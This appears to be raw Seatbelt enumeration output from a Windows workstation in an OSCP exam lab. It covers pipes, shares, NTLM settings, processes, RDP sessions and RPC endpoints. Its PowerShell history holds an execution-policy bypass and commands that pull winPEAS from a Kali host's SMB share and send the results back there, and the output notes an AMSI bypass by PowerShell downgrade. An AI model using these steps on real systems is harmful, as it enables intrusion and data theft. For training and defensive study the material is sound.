  KB5044033  10/9/2024 6:18:32 PM    MoUpdateOrchestrator 2024-10 Cumulative Update for .NET Framework 3.5 and 4.8.1 for Windows 11, version 23H2 for x64 (KB5044033)
             10/9/2024 6:18:02 PM    MoUpdateOrchestrator Broadcom Inc. - Net - 1.9.19.0
  KB2267602  10/9/2024 6:17:45 PM    MoUpdateOrchestrator Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
====== NamedPipes ======

2032,svchost,atsvc
1060,svchost,Ctx_WinStation_API_service
1004,svchost,epmapper
1448,svchost,eventlog
    SDDL         : O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)
3020,vmtoolsd,giTrayPipe0eabc146-2406-4edb-bbe7-f2adaa8f970c
608,wininit,InitShutdown
3752,msedgewebview2,LOCAL\crashpad_3752_YXBGRVGITCBSAATA
    SDDL         : O:S-1-5-21-2481101513-2954867870-2660283483-1106G:DUD:(A;;FA;;;SY)(A;;FA;;;S-1-5-21-2481101513-2954867870-2660283483-1106)(A;;0x12019f;;;AC)
0,Unk,LOCAL\mojo.3404.6896.6822827938938489019
0,Unk,LOCAL\mojo.3752.7232.11441647077005904461
0,Unk,LOCAL\mojo.3752.7232.12674074188932973515
0,Unk,LOCAL\mojo.3752.7232.3421434372077058219
0,Unk,LOCAL\mojo.3752.7232.8348170557681399869
0,Unk,LOCAL\mojo.3752.7352.1223149022151446966
0,Unk,LOCAL\mojo.3752.7352.16878035828237358043
0,Unk,LOCAL\mojo.3752.7352.6943523179129756811
0,Unk,LOCAL\mojo.3752.7352.7094935669482349185
0,Unk,LOCAL\mojo.3752.7352.7765783054657177288
0,Unk,LOCAL\mojo.3752.7352.7827711408126963804
0,Unk,LOCAL\mojo.3752.7352.861895670992531673
748,lsass,lsass
412,svchost,LSM_API_service
5172,SearchIndexer,MsFteWds
716,services,ntsvcs
0,Unk,PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
4236,powershell,PSHost.134162030965905639.4236.DefaultAppDomain.powershell
9116,powershell,PSHost.134162032898124931.9116.DefaultAppDomain.powershell
2276,svchost,SessEnvPublicRpc
3168,svchost,srvsvc
1060,svchost,TermSrv_API_service
3108,svchost,trkwks
0,Unk,TSVCPIPE-19c1492e-adcd-4d4d-9259-38c99b6ee60d
3004,VGAuthService,vgauth-service
    SDDL         : O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)
1324,svchost,W32TIME_ALT
3404,Widgets,WidgetsCommandPipe
0,Unk,Winsock2\CatalogChangeListener-19c-0
0,Unk,Winsock2\CatalogChangeListener-260-0
0,Unk,Winsock2\CatalogChangeListener-2cc-0
0,Unk,Winsock2\CatalogChangeListener-2ec-0
0,Unk,Winsock2\CatalogChangeListener-3ec-0
0,Unk,Winsock2\CatalogChangeListener-5a8-0
0,Unk,Winsock2\CatalogChangeListener-7f0-0
0,Unk,Winsock2\CatalogChangeListener-8e4-0
1944,svchost,wkssvc
====== NetworkProfiles ======

ERROR: Unable to collect. Must be an administrator.
====== NetworkShares ======

  Name                           : ADMIN$
  Path                           : C:\Windows
  Description                    : Remote Admin
  Type                           : Disk Drive Admin

  Name                           : C$
  Path                           : C:\
  Description                    : Default share
  Type                           : Disk Drive Admin

  Name                           : IPC$
  Path                           : 
  Description                    : Remote IPC
  Type                           : IPC Admin

====== NTLMSettings ======

  LanmanCompatibilityLevel    : (Send NTLMv2 response only - Win7+ default)

  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : 1 (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require128BitKey)
      NTLMMinServerSec        : 536870912 (Require128BitKey)


  NTLM Auditing and Restrictions
      InboundRestrictions     : (Not defined)
      OutboundRestrictions    : (Not defined)
      InboundAuditing         : (Not defined)
      OutboundExceptions      : 
====== OfficeMRUs ======

Enumerating Office most recently used files for the last 7 days

  App       User                     LastAccess    FileName
  ---       ----                     ----------    --------
====== OneNote ======


    OneNote files (Administrator):



    OneNote files (r.andrews):


====== OptionalFeatures ======

State    Name                                               Caption
Enabled  MediaPlayback                                      Media Features
Enabled  MicrosoftWindowsPowerShellV2                       Windows PowerShell 2.0 Engine
Enabled  MicrosoftWindowsPowerShellV2Root                   Windows PowerShell 2.0
Enabled  MSRDC-Infrastructure                               Remote Differential Compression API Support
Enabled  NetFx4-AdvSrvs                                     .NET Framework 4.8 Advanced Services
Enabled  Printing-Foundation-Features                       Print and Document Services
Enabled  Printing-Foundation-InternetPrinting-Client        Internet Printing Client
Enabled  Printing-PrintToPDFServices-Features               Microsoft Print to PDF
Enabled  SearchEngine-Client-Package                        Windows Search
Enabled  SmbDirect                                          SMB Direct
Enabled  WCF-Services45                                     WCF Services
Enabled  WCF-TCP-PortSharing45                              TCP Port Sharing
Enabled  Windows-Defender-Default-Definitions               
Enabled  WindowsMediaPlayer                                 Windows Media Player Legacy (App)
Enabled  WorkFolders-Client                                 Work Folders Client
====== OracleSQLDeveloper ======

====== OSInfo ======

  Hostname                      :  WS26
  Domain Name                   :  oscp.exam
  Username                      :  OSCP\r.andrews
  ProductName                   :  Windows 10 Enterprise
  EditionID                     :  Enterprise
  ReleaseId                     :  2009
  Build                         :  22631.4317
  BuildBranch                   :  ni_release
  CurrentMajorVersionNumber     :  10
  CurrentVersion                :  6.3
  Architecture                  :  AMD64
  ProcessorCount                :  2
  IsVirtualMachine              :  True
  BootTimeUtc (approx)          :  2/22/2026 2:45:52 AM (Total uptime: 00:01:23:34)
  HighIntegrity                 :  False
  IsLocalAdmin                  :  False
  CurrentTimeUtc                :  2/22/2026 4:09:26 AM (Local time: 2/21/2026 8:09:26 PM)
  TimeZone                      :  Pacific Standard Time
  TimeZoneOffset                :  -08:00:00
  InputLanguage                 :  Japanese
  InstalledInputLanguages       :  Japanese, US, Japanese
  MachineGuid                   :  63170b82-467f-4fa8-8c64-b9db48dbab26
====== OutlookDownloads ======

====== PoweredOnEvents ======

Collecting kernel boot (EID 12) and shutdown (EID 13) events from the last 7 days

Powered On Events (Time is local time)
====== PowerShell ======


  Installed CLR Versions
      4.0.30319

  Installed PowerShell Versions
      2.0
        [!] Version 2.0.50727 of the CLR is not installed - PowerShell v2.0 won't be able to run.
      5.1.22621.1

  Transcription Logging Settings
      Enabled            : False
      Invocation Logging : False
      Log Directory      : 

  Module Logging Settings
      Enabled             : False
      Logged Module Names :

  Script Block Logging Settings
      Enabled            : False
      Invocation Logging : False

  Anti-Malware Scan Interface (AMSI)
      OS Supports AMSI: True
        [!] You can do a PowerShell version downgrade to bypass AMSI.
====== PowerShellEvents ======

Searching script block logs (EID 4104) for sensitive data.

====== PowerShellHistory ======

  UserName                       : r.andrews
  FileName                       : C:\Users\r.andrews\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
  Match                          : net use \\192.168.49.104\share /user:username pw

  Context                        : cd ~
powershell -ep bypass
net use \\192.168.49.104\share /user:username pw
cp \\192.168.49.104\share\winPEASx64.exe .
.\winPEASx64.exe | Tee-Object -FilePath \\192.168.49.104\share\peas_result.txt
net use

====== Printers ======

ERROR:   [!] Terminating exception running command 'Printers': System.Management.ManagementException: Generic failure 
   at System.Management.ManagementException.ThrowWithExtendedInfo(ManagementStatus errorCode)
   at System.Management.ManagementObjectCollection.ManagementObjectEnumerator.MoveNext()
   at Seatbelt.Commands.Windows.PrintersCommand.<Execute>d__9.MoveNext()
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== ProcessCreationEvents ======

ERROR: Unable to collect. Must be an administrator.
====== Processes ======

Collecting Non Microsoft Processes (via WMI)

 ProcessName                              : vmtoolsd
 ProcessId                                : 1292
 ParentProcessId                          : 4916
 CompanyName                              : VMware, Inc.
 Description                              : VMware Tools Core Service
 Version                                  : 12.1.0.37487
 Path                                     : C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 CommandLine                              : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
 IsDotNet                                 : False
 ProcessProtectionInformation             : 

====== ProcessOwners ======

 rdpclip.exe                                        6920       OSCP\r.andrews
 sihost.exe                                         4124       OSCP\r.andrews
 svchost.exe                                        4352       OSCP\r.andrews
 svchost.exe                                        3964       OSCP\r.andrews
 taskhostw.exe                                      6740       OSCP\r.andrews
 explorer.exe                                       4916       OSCP\r.andrews
 svchost.exe                                        7640       OSCP\r.andrews
 SearchHost.exe                                     8052       OSCP\r.andrews
 StartMenuExperienceHost.exe                        8060       OSCP\r.andrews
 RuntimeBroker.exe                                  8164       OSCP\r.andrews
 svchost.exe                                        7288       OSCP\r.andrews
 Widgets.exe                                        3404       OSCP\r.andrews
 RuntimeBroker.exe                                  7400       OSCP\r.andrews
 dllhost.exe                                        8556       OSCP\r.andrews
 ctfmon.exe                                         7088       OSCP\r.andrews
 UserOOBEBroker.exe                                 6636       OSCP\r.andrews
 TextInputHost.exe                                  8828       OSCP\r.andrews
 vmtoolsd.exe                                       1292       OSCP\r.andrews
 powershell.exe                                     4236       OSCP\r.andrews
 conhost.exe                                        6776       OSCP\r.andrews
 Notepad.exe                                        1916       OSCP\r.andrews
 dllhost.exe                                        4796       OSCP\r.andrews
 svchost.exe                                        7248       OSCP\r.andrews
 OneDrive.exe                                       9012       OSCP\r.andrews
 powershell.exe                                     9116       OSCP\r.andrews
 msedgewebview2.exe                                 3752       OSCP\r.andrews
 msedgewebview2.exe                                 5800       OSCP\r.andrews
 msedgewebview2.exe                                 8588       OSCP\r.andrews
 msedgewebview2.exe                                 4172       OSCP\r.andrews
 msedgewebview2.exe                                 1460       OSCP\r.andrews
 msedgewebview2.exe                                 9004       OSCP\r.andrews
 ShellExperienceHost.exe                            8944       OSCP\r.andrews
 svchost.exe                                        8084       OSCP\r.andrews
 Seatbelt.exe                                       3180       OSCP\r.andrews
====== PSSessionSettings ======

ERROR: Unable to collect. Must be an administrator.
====== PuttyHostKeys ======

====== PuttySessions ======

====== RDCManFiles ======

====== RDPSavedConnections ======

====== RDPSessions ======

  SessionID                     :  0
  SessionName                   :  Services
  UserName                      :  \
  State                         :  Disconnected
  HostName                      :  
  FarmName                      :  
  LastInput                     :  04h:09m:57s:739ms
  ClientIP                      :  
  ClientHostname                :  
  ClientResolution              :  
  ClientBuild                   :  0
  ClientHardwareId              :  0,0,0,0
  ClientDirectory               :  

  SessionID                     :  1
  SessionName                   :  Console
  UserName                      :  \
  State                         :  Connected
  HostName                      :  
  FarmName                      :  
  LastInput                     :  04h:10m:22s:248ms
  ClientIP                      :  
  ClientHostname                :  
  ClientResolution              :  640x480 @ 2 bits per pixel
  ClientBuild                   :  0
  ClientHardwareId              :  0,0,0,0
  ClientDirectory               :  

  SessionID                     :  2
  SessionName                   :  RDP-Tcp#0
  UserName                      :  OSCP\r.andrews
  State                         :  Active
  HostName                      :  
  FarmName                      :  
  LastInput                     :  00h:04m:10s:702ms
  ClientIP                      :  192.168.49.104
  ClientHostname                :  kali
  ClientResolution              :  1024x768 @ 32 bits per pixel
  ClientBuild                   :  18363
  ClientHardwareId              :  0,0,0,0
  ClientDirectory               :  C:\Windows\System32\mstscax.dll

====== RDPsettings ======

RDP Server Settings:
  NetworkLevelAuthentication: 
  BlockClipboardRedirection:  
  BlockComPortRedirection:    
  BlockDriveRedirection:      
  BlockLptPortRedirection:    
  BlockPnPDeviceRedirection:  
  BlockPrinterRedirection:    
  AllowSmartCardRedirection:  

RDP Client Settings:
  DisablePasswordSaving: True
  RestrictedRemoteAdministration: False
====== RecycleBin ======

Recycle Bin Files Within the last 30 Days

====== reg ======

HKLM\Software ! (default) : 
HKLM\Software\Classes ! (default) : 
HKLM\Software\Clients ! (default) : 
HKLM\Software\CVSM ! (default) : 
HKLM\Software\DefaultUserEnvironment ! (default) : 
HKLM\Software\Google ! (default) : 
HKLM\Software\Intel ! (default) : 
HKLM\Software\Microsoft ! (default) : 
HKLM\Software\ODBC ! (default) : 
HKLM\Software\OEM ! (default) : 
HKLM\Software\OpenSSH ! (default) : 
HKLM\Software\Partner ! (default) : 
HKLM\Software\Policies ! (default) : 
HKLM\Software\RegisteredApplications ! (default) : 
HKLM\Software\Setup ! (default) : 
HKLM\Software\SimonTatham ! (default) : 
HKLM\Software\VMware, Inc. ! (default) : 
HKLM\Software\WOW6432Node ! (default) : 
====== RPCMappedEndpoints ======

  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncacn_ip_tcp:[49669]
  cc105610-da03-467e-bc73-5b9e2937458d v1.0 (LiveIdSvc RPC Interface): ncalrpc:[LRPC-eca8c8795546f36a66]
  faf2447b-b348-4feb-8dbe-beee5b7f7778 v1.0 (OnlineProviderCert RPC Interface): ncalrpc:[LRPC-eca8c8795546f36a66]
  572e35b4-1344-4565-96a1-f5df3bfa89bb v1.0 (LiveIdSvcNotify RPC Interface): ncalrpc:[liveidsvcnotify]
  d2716e94-25cb-4820-bc15-537866578562 v1.0 (): ncalrpc:[OLE5361BDC3E3719A90B7AB64F1319A]
  d2716e94-25cb-4820-bc15-537866578562 v1.0 (): ncalrpc:[LRPC-26af8aaa87bc4e2072]
  0c53aa2e-fb1c-49c5-bfb6-c54f8e5857cd v1.0 (): ncalrpc:[OLE5361BDC3E3719A90B7AB64F1319A]
  0c53aa2e-fb1c-49c5-bfb6-c54f8e5857cd v1.0 (): ncalrpc:[LRPC-26af8aaa87bc4e2072]
  923c9623-db7f-4b34-9e6d-e86580f8ca2a v1.0 (): ncalrpc:[OLE5361BDC3E3719A90B7AB64F1319A]
  923c9623-db7f-4b34-9e6d-e86580f8ca2a v1.0 (): ncalrpc:[LRPC-26af8aaa87bc4e2072]
  e8748f69-a2a4-40df-9366-62dbeb696e26 v0.0 (): ncalrpc:[OLE5361BDC3E3719A90B7AB64F1319A]
  e8748f69-a2a4-40df-9366-62dbeb696e26 v0.0 (): ncalrpc:[LRPC-26af8aaa87bc4e2072]
  c8ba73d2-3d55-429c-8e9a-c44f006f69fc v0.0 (): ncalrpc:[OLE5361BDC3E3719A90B7AB64F1319A]
  c8ba73d2-3d55-429c-8e9a-c44f006f69fc v0.0 (): ncalrpc:[LRPC-26af8aaa87bc4e2072]
  43890c94-bfd7-4655-ad6a-b4a68397cdcb v0.0 (): ncalrpc:[OLE5361BDC3E3719A90B7AB64F1319A]
  43890c94-bfd7-4655-ad6a-b4a68397cdcb v0.0 (): ncalrpc:[LRPC-26af8aaa87bc4e2072]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLED908773E42EA8D853322B7132422]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-0ab021e7016e13f0c5]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLED908773E42EA8D853322B7132422]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-0ab021e7016e13f0c5]
  0497b57d-2e66-424f-a0c6-157cd5d41700 v1.0 (AppInfo): ncalrpc:[LRPC-aca94d80134d491e21]
  201ef99a-7fa0-444c-9399-19ba84f12a1a v1.0 (AppInfo): ncalrpc:[LRPC-aca94d80134d491e21]
  5f54ce7d-5b79-4175-8584-cb65313a0e98 v1.0 (AppInfo): ncalrpc:[LRPC-aca94d80134d491e21]
  fd7a0523-dc70-43dd-9b2e-9c5ed48225b1 v1.0 (AppInfo): ncalrpc:[LRPC-aca94d80134d491e21]
  58e604e8-9adb-4d2e-a464-3b0683fb1480 v1.0 (AppInfo): ncalrpc:[LRPC-aca94d80134d491e21]
  0f738e20-73c0-4ca8-aa6a-8dfef545fea8 v1.0 (AppInfo): ncalrpc:[LRPC-aca94d80134d491e21]
  8ec21e98-b5ce-4916-a3d6-449fa428a007 v0.0 (): ncalrpc:[OLE47F1E79007464BA6BB05F7CF9943]
  8ec21e98-b5ce-4916-a3d6-449fa428a007 v0.0 (): ncalrpc:[LRPC-87cd004c1b4ff0d852]
  0fc77b1a-95d8-4a2e-a0c0-cff54237462b v0.0 (): ncalrpc:[OLE47F1E79007464BA6BB05F7CF9943]
  0fc77b1a-95d8-4a2e-a0c0-cff54237462b v0.0 (): ncalrpc:[LRPC-87cd004c1b4ff0d852]
  b1ef227e-dfa5-421e-82bb-67a6a129c496 v0.0 (): ncalrpc:[OLE47F1E79007464BA6BB05F7CF9943]
  b1ef227e-dfa5-421e-82bb-67a6a129c496 v0.0 (): ncalrpc:[LRPC-87cd004c1b4ff0d852]
  169c453b-5955-4672-be44-21f61e9ef18f v1.0 (INgcContainerEnum): ncalrpc:[LRPC-8e96dc8a1e22359b4e]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WMsgKRpc0283DDA2]
  12e65dd8-887f-41ef-91bf-8d816c42c2e7 v1.0 (Secure Desktop LRPC interface): ncalrpc:[WMsgKRpc0283DDA2]
  a4b8d482-80ce-40d6-934d-b22a01a44fe7 v1.0 (LicenseManager): ncalrpc:[LicenseServiceEndpoint]
  bf4dc912-e52f-4904-8ebe-9317c1bdd497 v1.0 (): ncalrpc:[OLE24CD9BF27988B7D1F33155C047E6]
  bf4dc912-e52f-4904-8ebe-9317c1bdd497 v1.0 (): ncalrpc:[LRPC-b00f1f1331cd39e3e6]
  10d20e7a-2530-494a-ac01-b8dd04480ad2 v1.0 (camsvc): ncalrpc:[OLE1144935BC48C54548FEEF37542F0]
  10d20e7a-2530-494a-ac01-b8dd04480ad2 v1.0 (camsvc): ncalrpc:[LRPC-262d31e48f8c5a5424]
  b04d3c44-f014-4530-88f3-ee7daa3e69b9 v1.0 (): ncalrpc:[LRPC-9faeabd6b287a30861]
  0767a036-0d22-48aa-ba69-b619480f38cb v1.0 (PcaSvc): ncalrpc:[LRPC-42fae51ab02cdeeb98]
  44d1520b-6133-41f0-8a66-d37305ecc357 v0.0 (): ncalrpc:[LRPC-2778dbe763fda6453d]
  f5663d1c-7cd6-4109-9d01-2c187b75c38f v0.0 (): ncalrpc:[LRPC-2778dbe763fda6453d]
  4b112204-0e19-11d3-b42b-0000f81feb9f v1.0 (): ncalrpc:[LRPC-f439951824b902db90]
  c27f3c08-92ba-478c-b446-b419c4cef0e2 v1.0 (): ncalrpc:[LRPC-b104b1d2327c4c2578]
  f3f09ffd-fbcf-4291-944d-70ad6e0e73bb v1.0 (): ncalrpc:[LRPC-3203b50960c53dd7fc]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WMsgKRpc0AAA31]
  7df1ceae-de4e-4e6f-ab14-49636e7c2052 v1.0 (): ncalrpc:[LRPC-6d038f1ea08ad9648d]
  d4051bde-9cdd-4910-b393-4aa85ec3c482 v1.0 (): ncalrpc:[OLECAF04B83661D2D50D639CDAD0D8B]
  d4051bde-9cdd-4910-b393-4aa85ec3c482 v1.0 (): ncalrpc:[LRPC-0941eed42687b5eff6]
  4c9dbf19-d39e-4bb9-90ee-8f7179b20283 v1.0 (): ncalrpc:[OLECAF04B83661D2D50D639CDAD0D8B]
  4c9dbf19-d39e-4bb9-90ee-8f7179b20283 v1.0 (): ncalrpc:[LRPC-0941eed42687b5eff6]
  fd8be72b-a9cd-4b2c-a9ca-4ded242fbe4d v1.0 (): ncalrpc:[OLECAF04B83661D2D50D639CDAD0D8B]
  fd8be72b-a9cd-4b2c-a9ca-4ded242fbe4d v1.0 (): ncalrpc:[LRPC-0941eed42687b5eff6]
  95095ec8-32ea-4eb0-a3e2-041f97b36168 v1.0 (): ncalrpc:[OLECAF04B83661D2D50D639CDAD0D8B]
  95095ec8-32ea-4eb0-a3e2-041f97b36168 v1.0 (): ncalrpc:[LRPC-0941eed42687b5eff6]
  e38f5360-8572-473e-b696-1b46873beeab v1.0 (): ncalrpc:[OLECAF04B83661D2D50D639CDAD0D8B]
  e38f5360-8572-473e-b696-1b46873beeab v1.0 (): ncalrpc:[LRPC-0941eed42687b5eff6]
  d22895ef-aff4-42c5-a5b2-b14466d34ab4 v1.0 (): ncalrpc:[OLECAF04B83661D2D50D639CDAD0D8B]
  d22895ef-aff4-42c5-a5b2-b14466d34ab4 v1.0 (): ncalrpc:[LRPC-0941eed42687b5eff6]
  98cd761e-e77d-41c8-a3c0-0fb756d90ec2 v1.0 (): ncalrpc:[OLECAF04B83661D2D50D639CDAD0D8B]
  98cd761e-e77d-41c8-a3c0-0fb756d90ec2 v1.0 (): ncalrpc:[LRPC-0941eed42687b5eff6]
  1d45e083-478f-437c-9618-3594ced8c235 v1.0 (): ncalrpc:[OLECAF04B83661D2D50D639CDAD0D8B]
  1d45e083-478f-437c-9618-3594ced8c235 v1.0 (): ncalrpc:[LRPC-0941eed42687b5eff6]
  78dcce84-7f13-4139-b8cd-ef222aa0408b v1.0 (StateRepository): ncalrpc:[OLE15112FA2A6AB5D4A04C20762F606]
  78dcce84-7f13-4139-b8cd-ef222aa0408b v1.0 (StateRepository): ncalrpc:[LRPC-f692661dc420caf7af]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-cf277c21961fd0fd14]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-cf277c21961fd0fd14]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-cf277c21961fd0fd14]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[OLE30FC05400E0C95BBAA36B74C5298]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-3621ff9f682203cb4e]
  a398e520-d59a-4bdd-aa7a-3c1e0303a511 v1.0 (IKE/Authip API): ncalrpc:[LRPC-87bebabfa51ac7fbf0]
  714dc5c4-c5f6-466a-b037-a573c958031e v1.0 (ProcessTag Server Endpoint): ncalrpc:[OLE29182EE7686B808DA496E9ADFD18]
  714dc5c4-c5f6-466a-b037-a573c958031e v1.0 (ProcessTag Server Endpoint): ncalrpc:[LRPC-0fff378533c24c2fed]
  98716d03-89ac-44c7-bb8c-285824e51c4a v1.0 (XactSrv service): ncalrpc:[LRPC-773d75701f286b1b2f]
  1a0d010f-1c33-432c-b0f5-8cf4e8053099 v1.0 (IdSegSrv service): ncalrpc:[LRPC-773d75701f286b1b2f]
  367abb81-9844-35f1-ad32-98f038001003 v2.0 (): ncacn_ip_tcp:[49670]
  552d076a-cb29-4e44-8b6a-d15e59e2c0af v1.0 (IP Transition Configuration endpoint): ncalrpc:[LRPC-3d9a50b8712f0e6765]
  2e6035b2-e8f1-41a7-a044-656b439c4c34 v1.0 (Proxy Manager provider server endpoint): ncalrpc:[LRPC-3d9a50b8712f0e6765]
  2e6035b2-e8f1-41a7-a044-656b439c4c34 v1.0 (Proxy Manager provider server endpoint): ncalrpc:[TeredoDiagnostics]
  2e6035b2-e8f1-41a7-a044-656b439c4c34 v1.0 (Proxy Manager provider server endpoint): ncalrpc:[TeredoControl]
  c36be077-e14b-4fe9-8abc-e856ef4f048b v1.0 (Proxy Manager client server endpoint): ncalrpc:[LRPC-3d9a50b8712f0e6765]
  c36be077-e14b-4fe9-8abc-e856ef4f048b v1.0 (Proxy Manager client server endpoint): ncalrpc:[TeredoDiagnostics]
  c36be077-e14b-4fe9-8abc-e856ef4f048b v1.0 (Proxy Manager client server endpoint): ncalrpc:[TeredoControl]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[LRPC-3d9a50b8712f0e6765]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[TeredoDiagnostics]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[TeredoControl]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[OLE162BF9C85BAED873C989F14161E1]
  dd490425-5325-4565-b774-7e27d6c09c24 v1.0 (Base Firewall Engine API): ncalrpc:[LRPC-bc06c3c069db6e568a]
  7f9d11bf-7fb9-436b-a812-b2d50c5d4c03 v1.0 (Fw APIs): ncalrpc:[LRPC-bc06c3c069db6e568a]
  7f9d11bf-7fb9-436b-a812-b2d50c5d4c03 v1.0 (Fw APIs): ncalrpc:[LRPC-cd2dfaeb64d1e6dcea]
  f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 (Fw APIs): ncalrpc:[LRPC-bc06c3c069db6e568a]
  f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 (Fw APIs): ncalrpc:[LRPC-cd2dfaeb64d1e6dcea]
  f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 (Fw APIs): ncalrpc:[LRPC-87d84dc7e832157e93]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-bc06c3c069db6e568a]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-cd2dfaeb64d1e6dcea]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-87d84dc7e832157e93]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-7b98373c17bea3a32a]
  abfb6ca3-0c5e-4734-9285-0aee72fe8d1c v1.0 (): ncalrpc:[OLE6C0F7673BD8428E08E6170F501B9]
  abfb6ca3-0c5e-4734-9285-0aee72fe8d1c v1.0 (): ncalrpc:[LRPC-87b72933116b42fda6]
  b37f900a-eae4-4304-a2ab-12bb668c0188 v1.0 (): ncalrpc:[OLE6C0F7673BD8428E08E6170F501B9]
  b37f900a-eae4-4304-a2ab-12bb668c0188 v1.0 (): ncalrpc:[LRPC-87b72933116b42fda6]
  f44e62af-dab1-44c2-8013-049a9de417d6 v1.0 (): ncalrpc:[OLE6C0F7673BD8428E08E6170F501B9]
  f44e62af-dab1-44c2-8013-049a9de417d6 v1.0 (): ncalrpc:[LRPC-87b72933116b42fda6]
  c2d1b5dd-fa81-4460-9dd6-e7658b85454b v1.0 (): ncalrpc:[OLE6C0F7673BD8428E08E6170F501B9]
  c2d1b5dd-fa81-4460-9dd6-e7658b85454b v1.0 (): ncalrpc:[LRPC-87b72933116b42fda6]
  13560fa9-8c09-4b56-a1fd-04d083b9b2a1 v1.0 (): ncalrpc:[OLE6C0F7673BD8428E08E6170F501B9]
  13560fa9-8c09-4b56-a1fd-04d083b9b2a1 v1.0 (): ncalrpc:[LRPC-87b72933116b42fda6]
  b58aa02e-2884-4e97-8176-4ee06d794184 v1.0 (): ncalrpc:[LRPC-88a80bac8cfc54ff03]
  3473dd4d-2e88-4006-9cba-22570909dd10 v5.1 (WinHttp Auto-Proxy Service): ncalrpc:[LRPC-667a197af8ab220b97]
  3473dd4d-2e88-4006-9cba-22570909dd10 v5.1 (WinHttp Auto-Proxy Service): ncalrpc:[4623cc59-33a2-4521-8fd0-11f01f2b5e9e]
  b18fbab6-56f8-4702-84e0-41053293a869 v1.0 (UserMgrCli): ncalrpc:[OLEA69C504CD5E2DC1BBD6D61DD888E]
  b18fbab6-56f8-4702-84e0-41053293a869 v1.0 (UserMgrCli): ncalrpc:[LRPC-abeebb6c9adf0e1cb1]
  0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 (UserMgrCli): ncalrpc:[OLEA69C504CD5E2DC1BBD6D61DD888E]
  0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 (UserMgrCli): ncalrpc:[LRPC-abeebb6c9adf0e1cb1]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-21e912969837545206]
  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncalrpc:[LRPC-21e912969837545206]
  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncalrpc:[SessEnvPrivateRpc]
  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncacn_np:[\\pipe\\SessEnvPublicRpc]
  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncacn_ip_tcp:[49668]
  0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53 v1.0 (): ncalrpc:[LRPC-b1349865f873a2a359]
  1ff70682-0a51-30e8-076d-740be8cee98b v1.0 (): ncalrpc:[LRPC-b1349865f873a2a359]
  1ff70682-0a51-30e8-076d-740be8cee98b v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  378e52b0-c0a9-11cf-822d-00aa0051e40f v1.0 (): ncalrpc:[LRPC-b1349865f873a2a359]
  378e52b0-c0a9-11cf-822d-00aa0051e40f v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncalrpc:[LRPC-b1349865f873a2a359]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncacn_np:[\\PIPE\\atsvc]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncalrpc:[ubpmtaskhostchannel]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncalrpc:[LRPC-2e007fdec1ada6fbd5]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncalrpc:[LRPC-b1349865f873a2a359]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncalrpc:[ubpmtaskhostchannel]
